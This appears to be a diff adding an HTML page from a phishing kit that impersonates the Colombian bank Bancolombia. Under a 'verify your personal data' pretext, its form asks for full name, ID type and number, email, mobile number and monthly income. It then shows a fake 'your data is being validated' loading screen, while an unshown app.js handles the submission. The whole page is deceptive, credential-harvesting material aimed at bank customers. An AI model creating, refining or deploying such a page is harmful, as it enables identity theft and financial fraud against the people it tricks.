@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Verificación de Datos Personales</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }
+        body { font-family: 'Open Sans', Arial, sans-serif; font-size: 16px; color: #2c2a29; line-height: 24px; background-color: #f9f9fa; display: flex; flex-direction: column; min-height: 100vh; }
+        .decorative-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
+        .banner-programate { background: linear-gradient(135deg, #d4f1f4 0%, #b8e8ed 100%); padding: 16px 20px; display: flex; align-items: flex-start; gap: 12px; position: relative; z-index: 10; border-bottom: 1px solid #a0dce3; }
+        .banner-icon { width: 28px; height: 28px; background-color: #ffffff; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; }
+        .banner-icon svg { width: 16px; height: 16px; color: #0097a7; }
+        .banner-content { flex: 1; }
+        .banner-title { font-size: 15px; font-weight: 700; color: #212121; margin-bottom: 4px; }
+        .banner-description { font-size: 13px; color: #424242; line-height: 1.4; margin-bottom: 6px; }
+        .banner-link { color: #0097a7; font-size: 13px; font-weight: 700; text-decoration: underline; cursor: pointer; }
+        .main-container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; position: relative; z-index: 10; }
+        .brand-logo { height: 30px; margin-bottom: 40px; }
+        .page-title { color: #424242; font-size: 28px; font-weight: 400; margin-bottom: 50px; text-align: center; }
+        .login-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06); padding: 50px 60px; max-width: 620px; width: 100%; }
+        .card-greeting { color: #212121; font-size: 34px; font-weight: 700; margin-bottom: 12px; text-align: center; }
+        .card-description { color: #666666; font-size: 15px; margin-bottom: 32px; text-align: center; line-height: 1.6; max-width: 480px; margin-left: auto; margin-right: auto; }
+        .form-field { margin-bottom: 30px; position: relative; }
+        .field-wrapper { position: relative; }
+        .field-icon { position: absolute; left: 0; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; color: #666666; flex-shrink: 0; pointer-events: none; z-index: 2; }
+        .field-label { position: absolute; left: 30px; top: 50%; transform: translateY(-50%); font-size: 15px; color: #999999; transition: all 0.2s ease; pointer-events: none; z-index: 2; }
+        .form-control { width: 100%; padding: 20px 0 6px 30px; border: none; border-bottom: 2px solid #e0e0e0; font-size: 15px; background-color: transparent; font-family: 'Open Sans', Arial, sans-serif; color: #212121; font-weight: 400; transition: border-color 0.3s ease; line-height: 1.2; }
+        .form-control::placeholder { color: transparent; }
+        .form-control:focus { outline: none; border-bottom-color: #fdda24; }
+        .form-control:focus ~ .field-label, .form-control:not(:placeholder-shown) ~ .field-label, .form-control.has-value ~ .field-label { top: 2px; transform: translateY(0); font-size: 11px; color: #999999; }
+        select.form-control { cursor: pointer; appearance: none; background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 9L1 4h10z'/%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 8px center; padding-right: 30px; }
+        .form-field.has-error .form-control { border-bottom-color: #e53935; }
+        .error-msg { display: none; color: #e53935; font-size: 12px; margin-top: 4px; font-weight: 400; }
+        .form-field.has-error .error-msg { display: block; }
+        .submit-button { width: 100%; padding: 15px 32px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: not-allowed; border: none; background-color: #e0e0e0; color: #999999; transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif; margin-top: 15px; }
+        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
+        .submit-button.enabled:hover { background-color: #fdd007; }
+        .back-link { text-align: center; margin-top: 25px; }
+        .back-link a { color: #212121; font-size: 15px; text-decoration: underline; font-weight: 700; }
+        .site-footer { background-color: #ffffff; padding: 20px 30px; border-top: 1px solid #e0e0e0; position: relative; z-index: 10; }
+        .footer-wrapper { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+        .footer-navigation { display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
+        .footer-link { color: #666666; font-size: 13px; text-decoration: none; }
+        .footer-link:hover { text-decoration: underline; }
+        .link-separator { color: #cccccc; }
+        .session-info { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; }
+        .info-text { color: #666666; font-size: 12px; }
+        .footer-branding { max-width: 1400px; margin: 15px auto 0; display: flex; align-items: center; gap: 15px; }
+        .footer-logo { height: 30px; }
+        .regulatory-badges { display: flex; gap: 8px; align-items: center; }
+        .badge { background-color: #f0f0f0; padding: 4px 8px; border-radius: 3px; font-size: 8px; color: #333333; font-weight: 700; letter-spacing: 0.3px; white-space: nowrap; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
+        .form-row .form-field { margin-bottom: 0; }
+        .loading-overlay { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.25s ease; }
+        .loading-overlay.active { opacity: 1; pointer-events: all; }
+        .loading-logo { height: 36px; width: auto; margin-bottom: 48px; }
+        .spinner { width: 52px; height: 52px; margin-bottom: 36px; }
+        .spinner svg { width: 52px; height: 52px; animation: spin 1s linear infinite; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .loading-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; text-align: center; }
+        .loading-subtitle { font-size: 14px; color: #666; text-align: center; line-height: 1.55; max-width: 260px; }
+    </style>
+</head>
+<body>
+    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
+        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
+        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
+        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
+        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
+    </svg>
+    <div class="banner-programate">
+        <div class="banner-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <div class="banner-content">
+            <div class="banner-title">Verificación de datos personales</div>
+            <div class="banner-description">Para tu seguridad, es necesario verificar tus datos personales antes de continuar con el proceso.</div>
+            <a href="#" class="banner-link">Más información aquí.</a>
+        </div>
+    </div>
+    <main class="main-container">
+        <img src="bancol.png" alt="Bancolombia" class="brand-logo">
+        <h1 class="page-title">Verificación de Datos Personales</h1>
+        <div class="login-card">
+            <h2 class="card-greeting">Confirma tus datos</h2>
+            <p class="card-description">Por favor, verifica y completa la siguiente información para continuar con el proceso.</p>
+            <form id="datosForm" novalidate>
+                <div class="form-field" id="fieldNombre">
+                    <div class="field-wrapper">
+                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                        <input type="text" class="form-control" id="nombre" placeholder=" " required>
+                        <label class="field-label" for="nombre">Nombre completo</label>
+                    </div>
+                    <span class="error-msg">Ingresa tu nombre completo</span>
+                </div>
+                <div class="form-row">
+                    <div class="form-field" id="fieldTipoDoc">
+                        <div class="field-wrapper">
+                            <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2" ry="2"></rect><line x1="7" y1="10" x2="17" y2="10"></line><line x1="7" y1="14" x2="13" y2="14"></line></svg>
+                            <select class="form-control" id="tipoDoc" required>
+                                <option value="" disabled selected></option>
+                                <option value="CC">Cédula de Ciudadanía</option>
+                                <option value="CE">Cédula de Extranjería</option>
+                                <option value="TI">Tarjeta de Identidad</option>
+                                <option value="PAS">Pasaporte</option>
+                                <option value="NIT">NIT</option>
+                            </select>
+                            <label class="field-label" for="tipoDoc">Tipo de documento</label>
+                        </div>
+                        <span class="error-msg">Selecciona un tipo</span>
+                    </div>
+                    <div class="form-field" id="fieldNumDoc">
+                        <div class="field-wrapper">
+                            <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="12" y1="18" x2="12" y2="12"></line><line x1="9" y1="15" x2="15" y2="15"></line></svg>
+                            <input type="text" class="form-control" id="numDoc" placeholder=" " inputmode="numeric" required>
+                            <label class="field-label" for="numDoc">Número de documento</label>
+                        </div>
+                        <span class="error-msg">Ingresa el número</span>
+                    </div>
+                </div>
+                <div class="form-field" id="fieldCorreo">
+                    <div class="field-wrapper">
+                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                        <input type="email" class="form-control" id="correo" placeholder=" " required>
+                        <label class="field-label" for="correo">Correo electrónico</label>
+                    </div>
+                    <span class="error-msg">Ingresa un correo válido</span>
+                </div>
+                <div class="form-field" id="fieldCelular">
+                    <div class="field-wrapper">
+                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                        <input type="tel" class="form-control" id="celular" placeholder=" " inputmode="numeric" maxlength="10" required>
+                        <label class="field-label" for="celular">Número de celular</label>
+                    </div>
+                    <span class="error-msg">Ingresa un número válido (10 dígitos)</span>
+                </div>
+                <div class="form-field" id="fieldIngresos">
+                    <div class="field-wrapper">
+                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                        <input type="text" class="form-control" id="ingresos" placeholder=" " inputmode="numeric" required>
+                        <label class="field-label" for="ingresos">Ingresos mensuales (COP)</label>
+                    </div>
+                    <span class="error-msg">Ingresa tus ingresos mensuales</span>
+                </div>
+                <button type="submit" class="submit-button" id="btnSubmit" disabled>Continuar</button>
+                <div class="back-link"><a href="index.html">Volver atrás</a></div>
+            </form>
+        </div>
+    </main>
+    <div class="loading-overlay" id="loadingOverlay">
+        <img src="bancol.png" alt="Bancolombia" class="loading-logo">
+        <div class="spinner"><svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/><circle cx="26" cy="26" r="22" stroke="#FDDA24" stroke-width="4" stroke-linecap="round" stroke-dasharray="103 35" stroke-dashoffset="0"/></svg></div>
+        <p class="loading-title">Tus datos estan siendo validado por nuestro equipo.</p>
+        <p class="loading-subtitle">Esto puede tardar entre 1 y 2 minutos.</p>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
